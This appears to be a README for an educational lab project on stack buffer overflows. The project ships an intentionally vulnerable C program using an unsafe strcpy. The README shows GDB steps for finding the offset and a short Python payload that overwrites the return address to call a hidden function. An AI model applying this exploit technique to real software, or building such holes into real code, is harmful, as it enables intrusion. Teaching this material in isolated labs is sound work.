# Project 3.1: Buffer Overflow Basics

## Overview

Study buffer overflow vulnerabilities in a controlled environment. This project contains intentionally vulnerable programs to understand how buffer overflows work.

## Learning Objectives

- Understand stack buffer overflows
- Learn how return addresses can be overwritten
- Practice exploit development
- Understand modern protections

## Concepts Covered

1. **The Stack**
   - Stack frame layout
   - Return address location
   - Buffer placement

2. **Buffer Overflows**
   - Overflowing buffers
   - Overwriting return addresses
   - Control flow hijacking

3. **Exploitation**
   - Finding offsets
   - Crafting payloads
   - Debugging with GDB

## Programs

### vuln_bof.c
An intentionally vulnerable program with a buffer overflow.

**Features:**
- 64-byte buffer with unsafe strcpy
- Target function to call via exploitation
- Built-in help showing the secret function address
- Safe and vulnerable versions

## Getting Started

```bash
cd project-3.1-buffer-overflow

# Compile vulnerable version (no protections)
make vuln_bof

# Compile safe version (with protections)
make vuln_bof_safe

# Run and see help
./vuln_bof help
```

## Exploitation Exercise

### Step 1: Understanding the Program
```bash
./vuln_bof help
```

This shows you:
- The address of the secret function
- Basic exploitation steps
- Example exploit command

### Step 2: Finding the Offset
Use GDB to find the exact offset:
```bash
gdb ./vuln_bof
(gdb) run < <(python3 -c 'print("A"*100)')
(gdb) info registers rip
```

### Step 3: Crafting the Exploit
Once you know the offset, craft your payload:
```python
#!/usr/bin/env python3
import struct

offset = 72  # Your offset here
target_addr = 0x401234  # Address from ./vuln_bof help

payload = b"A" * offset
payload += struct.pack("<Q", target_addr)  # Little-endian 64-bit

print(payload.decode('latin-1'), end='')
```

### Step 4: Running the Exploit
```bash
python3 exploit.py | ./vuln_bof
```

## Advanced Exercises

1. **Exercise 1**: Find the offset without using the help command
   - Use GDB and pattern_create/pattern_offset
   - Calculate manually from stack inspection

2. **Exercise 2**: Exploit without the printed address
   - Use GDB to find the secret_function address
   - Practice realistic exploitation

3. **Exercise 3**: Try the safe version
   - See how stack protector prevents exploitation
   - Understand modern defenses

## Protection Mechanisms

### Disabled in vuln_bof:
- Stack canaries (would detect overflow)
- NX/DEP (would prevent code execution on stack)
- PIE (would randomize addresses)

### Enabled in vuln_bof_safe:
- Stack protector (detects buffer overflows)
- Fortify source (safer string functions)

## Debugging Tips

```bash
# Run with GDB
gdb ./vuln_bof

# Set breakpoints
(gdb) break vulnerable_function
(gdb) break *0x401234  # At secret_function

# Examine stack
(gdb) x/20x $rsp
(gdb) x/20x $rbp

# Step through
(gdb) si  # Step instruction
(gdb) ni  # Next instruction

# Show registers
(gdb) info registers
```

## Important Notes

⚠️ **Educational Only**
- Use only for learning
- Practice in isolated VMs
- Never on production systems

⚠️ **Modern Systems**
- Real systems have ASLR, making addresses random
- Stack canaries detect overwrites
- This is simplified for learning

## Resources

- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html)
- [Buffer Overflow Attacks](https://en.wikipedia.org/wiki/Buffer_overflow)
- [GDB Tutorial](https://www.gnu.org/software/gdb/documentation/)

## Next Steps

After mastering buffer overflows, move to:
- Project 3.2: Format String Vulnerabilities
- Project 3.3: Return-Oriented Programming
